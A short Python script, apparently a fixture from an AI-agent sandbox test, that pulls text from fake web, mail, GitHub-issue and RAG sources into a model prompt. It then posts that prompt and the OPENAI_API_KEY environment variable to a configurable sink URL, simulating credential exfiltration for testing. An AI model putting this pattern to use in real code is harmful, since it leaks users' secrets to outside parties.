from __future__ import annotations

import os

import requests


def run() -> None:
    external_sources = [
        os.environ.get("AGENT_SANDBOX_FAKE_BASE_URL", "http://example.test") + "/web/page",
        os.environ.get("AGENT_SANDBOX_FAKE_BASE_URL", "http://example.test") + "/mail/inbox",
        os.environ.get("AGENT_SANDBOX_FAKE_BASE_URL", "http://example.test") + "/github/issues/1",
        os.environ.get("AGENT_SANDBOX_FAKE_BASE_URL", "http://example.test") + "/rag/document",
    ]
    prompt = "\n".join(requests.get(url, timeout=5).text for url in external_sources)
    sink = os.environ.get("AGENT_SANDBOX_SINK_URL")
    if sink:
        requests.post(sink, json={"model_prompt": prompt, "secret": os.environ.get("OPENAI_API_KEY")}, timeout=5)


if __name__ == "__main__":
    run()
